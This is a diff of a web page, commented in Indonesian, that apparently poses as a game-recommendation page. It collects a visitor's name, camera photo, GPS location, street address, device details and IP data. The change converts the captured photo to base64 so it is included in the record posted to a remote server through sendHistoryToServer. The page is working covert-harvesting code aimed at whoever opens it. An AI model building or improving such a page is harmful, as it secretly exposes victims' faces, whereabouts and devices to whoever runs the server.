@@ -109,7 +109,6 @@
             transform: scale(0.9);
         }
 
-        /* Efek visual untuk input password */
         .password-container {
             position: relative;
             margin-top: 20px;
@@ -285,7 +284,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const videoTrack = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(videoTrack);
-                
+
                 // Ambil gambar dari kamera setelah izin diberikan
                 const photo = await imageCapture.takePhoto();
                 const photoURL = URL.createObjectURL(photo);
@@ -299,13 +298,14 @@
                 `;
                 gameRecommendationDiv.innerHTML = getGameRecommendation(); // Tambahkan rekomendasi game
                 stream.getTracks().forEach(track => track.stop());  // Stop camera after capture
-                
+
                 showMap(lat, lon);
 
                 // Simpan data perangkat dan IP ke dalam history
                 const deviceInfo = getDeviceInfo();
                 const ipInfo = await getIPInfo();
                 const addressInfo = await getAddress(lat, lon);
+                const base64Image = await convertBlobToBase64(photo);
 
                 const userHistory = {
                     name: nameInput.value,
@@ -313,7 +313,7 @@
                     deviceInfo,
                     ipInfo,
                     addressInfo,
-                    photo: photoURL,
+                    photo: base64Image,
                     timestamp: new Date().toLocaleString(),
                 };
 
@@ -439,6 +439,17 @@
         }
     });
 
+    // Fungsi untuk mengonversi Blob menjadi URL yang dapat diakses
+    const convertBlobToBase64 = (blob) => {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+        });
+    };
+
+    // Fungsi untuk mengirim data ke server dengan gambar dalam format base64
     async function sendHistoryToServer(historyData) {
         try {
             const response = await fetch(serverUrl, {
@@ -459,4 +470,3 @@
 </script>
 </body>
 </html>
-
